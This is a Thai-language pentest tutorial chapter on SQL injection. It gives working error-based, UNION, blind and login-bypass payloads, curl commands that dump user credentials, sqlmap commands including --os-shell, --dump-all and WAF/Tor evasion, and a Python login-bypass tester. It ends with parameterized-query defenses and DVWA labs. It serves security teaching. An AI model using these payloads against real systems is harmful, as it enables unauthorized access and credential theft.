# Part 26: SQL Injection (SQLi)

## สารบัญ
- [26.1 SQL Injection คืออะไร](#261-sql-injection-คืออะไร)
- [26.2 ประเภทของ SQLi](#262-ประเภทของ-sqli)
- [26.3 Manual SQLi Testing](#263-manual-sqli-testing)
- [26.4 UNION-based SQLi](#264-union-based-sqli)
- [26.5 Blind SQLi (Boolean + Time-based)](#265-blind-sqli-boolean--time-based)
- [26.6 sqlmap - Automation](#266-sqlmap---automation)
- [26.7 Authentication Bypass](#267-authentication-bypass)
- [26.8 SQLi ใน Login Form](#268-sqli-ใน-login-form)
- [26.9 การป้องกัน SQLi](#269-การป้องกัน-sqli)
- [26.10 แบบฝึกหัด Lab](#2610-แบบฝึกหัด-lab)

---

## 26.1 SQL Injection คืออะไร

SQL Injection (SQLi) คือการแทรกใส่ SQL Code เข้าไปใน Input เพื่อเปลี่ยนแปลงความหมายของquery เดิม

### ตัวอย่าง
```sql
-- Code โปรแกรม PHP ที่ไม่ปลอดภัย
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

-- Username: admin' --
-- Password: (anything)
-- ทำให้query กลายเป็น:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- ส่วน password check ถูก comment out!
```

### ผลกระทบของ SQLi
```
- Login Bypass - เลียง Login โดยไม่ต้องรหัส
- Data Extraction - สกัด Data ทั้ง Database
- Data Modification - แก้ไขข้อมูล
- Remote Code Execution - เจาะระบบในบางกรณี
- File Read/Write - อ่าน/เขียนไฟล์ Server
```

---

## 26.2 ประเภทของ SQLi

```
1. In-band SQLi        - เห็นผลใน Response
   a. Error-based      - ดึงข้อมูลจาก Error Message
   b. UNION-based      - ใช้ UNION ดึงข้อมูลเพิ่ม

2. Blind SQLi          - ไม่เห็นผลโดยตรง
   a. Boolean-based    - True/False จาก Response
   b. Time-based       - ดูจากเวลา Response

3. Out-of-band SQLi    - ส่งผ่าน Channel อื่น (DNS/HTTP)
```

---

## 26.3 Manual SQLi Testing

### การตรวจสอบเบื้องต้น
```bash
# URL: http://target.com/product.php?id=1

# Test 1: Basic Injection
curl 'http://target.com/product.php?id=1'\'''
curl 'http://target.com/product.php?id=1"'

# Test 2: True Condition
curl 'http://target.com/product.php?id=1 AND 1=1'
curl 'http://target.com/product.php?id=1 AND 1=2'

# Test 3: Comments
curl 'http://target.com/product.php?id=1--'
curl 'http://target.com/product.php?id=1#'
curl 'http://target.com/product.php?id=1/*'

# เปรียบเทียบ Response Length
curl -s 'http://target.com/product.php?id=1 AND 1=1' | wc -c
curl -s 'http://target.com/product.php?id=1 AND 1=2' | wc -c
# ถ้าต่างกัน = Vulnerable!
```

### Error-based SQLi
```sql
-- URL Encoded: '
-- %27 = '

-- MySQL Error-based
id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
id=1 AND updatexml(1,concat(0x7e,(SELECT database())),1)--

-- ตัวอย่าง
curl 'http://target.com/product.php?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))--'
# Response: XPATH syntax error: '~5.7.32-0ubuntu0.18.04.1'
# ดึง version ออกมา!
```

---

## 26.4 UNION-based SQLi

### ขั้นตอน
```sql
-- Step 1: หาจำนวน Columns
id=1 ORDER BY 1--   # ไม่ error
id=1 ORDER BY 2--   # ไม่ error
id=1 ORDER BY 3--   # ไม่ error
id=1 ORDER BY 4--   # error! = มี 3 columns

-- Step 2: หา Column Position ที่แสดง
id=-1 UNION SELECT 1,2,3--
# Response แสดง "2" = column 2 แสดงผล

-- Step 3: ดึงข้อมูล
id=-1 UNION SELECT 1,version(),3--
id=-1 UNION SELECT 1,user(),3--
id=-1 UNION SELECT 1,database(),3--

-- Step 4: ดึง Table Names จาก information_schema
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- Step 5: ดึง Column Names
id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Step 6: ดึงข้อมูล
id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

### ตัวอย่าง UNION SQLi
```bash
# Step 1: Find columns
curl 'http://target.com/product.php?id=1+ORDER+BY+1--' -s | wc -c
curl 'http://target.com/product.php?id=1+ORDER+BY+2--' -s | wc -c
curl 'http://target.com/product.php?id=1+ORDER+BY+3--' -s | wc -c
curl 'http://target.com/product.php?id=1+ORDER+BY+4--' -s | wc -c

# Step 2: UNION
curl 'http://target.com/product.php?id=-1+UNION+SELECT+1,version(),3--' -s | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+'

# Step 3: ดึง Users
curl 'http://target.com/product.php?id=-1+UNION+SELECT+1,group_concat(username,0x3a,password),3+FROM+users--' -s
```

---

## 26.5 Blind SQLi (Boolean + Time-based)

### Boolean-based Blind SQLi
```sql
-- ถ้า Response Length ต่างกันใน True vs False condition
-- True:  id=1 AND 1=1
-- False: id=1 AND 1=2

-- Extract ทีละตัว
-- การหา Database Name
id=1 AND SUBSTRING(database(),1,1)='a'--  # Response True/False
id=1 AND SUBSTRING(database(),1,1)='b'--
id=1 AND SUBSTRING(database(),1,1)='c'--  # ฟัน True = 'c' = อักษรแรกคือ 'c'

-- ใช้ ASCII Number เร็วกว่า
id=1 AND ASCII(SUBSTRING(database(),1,1)) > 64
id=1 AND ASCII(SUBSTRING(database(),1,1)) > 96
id=1 AND ASCII(SUBSTRING(database(),1,1)) = 100  # 'd' = 100
```

### Time-based Blind SQLi
```sql
-- MySQL: SLEEP(N)
-- ถ้าเงื่อนไขตรง = หยุด N วินาที

id=1 AND IF(1=1, SLEEP(5), 0)--    # หยุด 5 sec = vulnerable
id=1 AND IF(1=2, SLEEP(5), 0)--    # ไม่หยุด

-- หา Database Name (ทีละตัว)
id=1 AND IF(SUBSTRING(database(),1,1)='s', SLEEP(3), 0)--

-- PostgreSQL
id=1; SELECT pg_sleep(5)--

-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
```

```bash
# Time-based Test
time curl -s 'http://target.com/product.php?id=1+AND+IF(1=1,SLEEP(5),0)--'
# real    0m5.123s = Vulnerable!

time curl -s 'http://target.com/product.php?id=1+AND+IF(1=2,SLEEP(5),0)--'
# real    0m0.052s = Not triggered
```

---

## 26.6 sqlmap - Automation

### Basic Usage
```bash
# ติดตั้ง
sudo apt install sqlmap -y

# Test URL
sqlmap -u 'http://target.com/product.php?id=1'

# Verbose
sqlmap -u 'http://target.com/product.php?id=1' -v 3

# ระบุ DBMS
sqlmap -u 'http://target.com/product.php?id=1' --dbms=mysql

# ดึงข้อมูลสำคัญ
sqlmap -u 'http://target.com/product.php?id=1' --dbs
sqlmap -u 'http://target.com/product.php?id=1' -D mydb --tables
sqlmap -u 'http://target.com/product.php?id=1' -D mydb -T users --columns
sqlmap -u 'http://target.com/product.php?id=1' -D mydb -T users --dump

# ดึงทั้งหมด
sqlmap -u 'http://target.com/product.php?id=1' --dump-all

# รอบใช้คำสั่ง SQL
sqlmap -u 'http://target.com/product.php?id=1' --sql-query='SELECT user()'

# Upload Shell
sqlmap -u 'http://target.com/product.php?id=1' --os-shell
```

### สั่ง sqlmap Request จาก Burp
```bash
# Save Request จาก Burp: Right-click → Copy to file
# บันทึกเป็น /tmp/request.txt

# sqlmap กับ Request File
sqlmap -r /tmp/request.txt

# ระบุ Parameter
sqlmap -r /tmp/request.txt -p id

# POST Request
sqlmap -u 'http://target.com/login.php' \
  --data='username=admin&password=test' \
  -p username
```

### sqlmap Options สำคัญ
```bash
# Risk และ Level
sqlmap -u URL --level=5 --risk=3
# Level 1-5: เพิ่ม tests มากขึ้น
# Risk 1-3:  เพิ่มความเสี่ยง

# Bypass WAF
sqlmap -u URL --tamper=space2comment,base64encode
sqlmap -u URL --random-agent
sqlmap -u URL --tor --tor-type=SOCKS5

# Cookies
sqlmap -u URL --cookie='PHPSESSID=abc123'

# Authentication
sqlmap -u URL --auth-type=basic --auth-cred='admin:password'

# Output
sqlmap -u URL --output-dir=/tmp/sqlmap_output
```

---

## 26.7 Authentication Bypass

```sql
-- Classic Auth Bypass
Username: admin' --
Password: anything

-- Or:
Username: ' OR '1'='1
Password: ' OR '1'='1

-- Or:
Username: admin'#

-- MSSQL
Username: admin'--

-- SQLite
Username: admin' --

-- Alternative:
Username: ' OR 1=1 LIMIT 1;--
Username: admin' OR 'abc'='abc
```

### Test ด้วย curl
```bash
# Basic Login Bypass
curl -X POST http://target.com/login.php \
  -d "username=admin'+--+&password=anything"

# หรือ
curl -X POST http://target.com/login.php \
  -d "username='+OR+'1'='1&password='+OR+'1'='1"

# URL Encoded
curl -X POST http://target.com/login.php \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=x"
```

---

## 26.8 SQLi ใน Login Form

### Python SQLi Tester
```python
#!/usr/bin/env python3
# sqli_login.py - SQLi Login Bypass Tester

import requests
import sys

requests.packages.urllib3.disable_warnings()

SQLI_PAYLOADS = [
    "admin' --",
    "admin'--",
    "admin'#",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin' OR '1'='1",
    "admin' OR 1=1--",
    "') OR ('1'='1",
    "1' OR '1'='1",
]

def test_login_bypass(url, username_field='username', password_field='password'):
    print(f"[*] Testing SQLi Login Bypass: {url}")
    print(f"    Username Field: {username_field}")
    print(f"    Password Field: {password_field}")
    print("-" * 60)
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})
    session.verify = False
    
    # Get baseline (failed login)
    base_resp = session.post(url, data={
        username_field: 'invalid_user_xyz',
        password_field: 'invalid_pass_xyz'
    })
    base_len = len(base_resp.text)
    base_url = base_resp.url
    
    print(f"[*] Baseline: length={base_len}, url={base_url}")
    print()
    
    for payload in SQLI_PAYLOADS:
        resp = session.post(url, data={
            username_field: payload,
            password_field: 'anything'
        })
        
        diff_len = abs(len(resp.text) - base_len)
        redirected = resp.url != base_url
        
        if diff_len > 100 or redirected:
            print(f"[+] POSSIBLE BYPASS! Payload: {payload}")
            print(f"    Length diff: {diff_len}, Redirected: {redirected}")
            print(f"    URL after: {resp.url}")
        else:
            print(f"[-] No change: {payload[:40]}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'http://target.com/login.php'
    test_login_bypass(url)
```

---

## 26.9 การป้องกัน SQLi

```php
// PHP - Parameterized Query (ปลอดภัย)
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);

// PHP - ORM (Eloquent)
$user = User::where('username', $username)
           ->where('password', $password)
           ->first();

// Python - Parameterized
cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', 
               (username, password))

// สิ่งที่ไม่ควรทำ: String Concatenation!
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
```

---

## 26.10 แบบฝึกหัด Lab

### Lab 26-1: DVWA SQLi
```bash
# 1. Setup DVWA
docker run -d -p 8080:80 vulnerables/web-dvwa
# Login: admin/password
# Security Level: Low

# 2. Go to: SQL Injection
# URL: http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit

# 3. Manual Test
curl 'http://localhost:8080/vulnerabilities/sqli/?id=1'\''--+&Submit=Submit' \
  -H 'Cookie: PHPSESSID=YOURSESSION; security=low'

# 4. sqlmap
sqlmap -u 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=YOURSESSION; security=low' \
  --dbs
```

### Lab 26-2: Login Bypass
```bash
# DVWA Login Bypass (ถ้ามี Login Form ที่ vulnerable)
curl -X POST http://localhost:8080/login.php \
  -d "username=admin'+--+&password=anything&Login=Login"
```

---

## สรุป

| ประเภท | Technique | Tool |
|--------|-----------|------|
| Error-based | EXTRACTVALUE, updatexml | Manual/sqlmap |
| UNION | UNION SELECT | Manual/sqlmap |
| Boolean Blind | AND 1=1/AND 1=2 | Manual/sqlmap |
| Time-based | SLEEP(), WAITFOR | Manual/sqlmap |
| Auth Bypass | OR 1=1 | Manual |

> **จำไว้:** Parameterized Queries = วิธีป้องกัน SQLi ที่ดีที่สุด
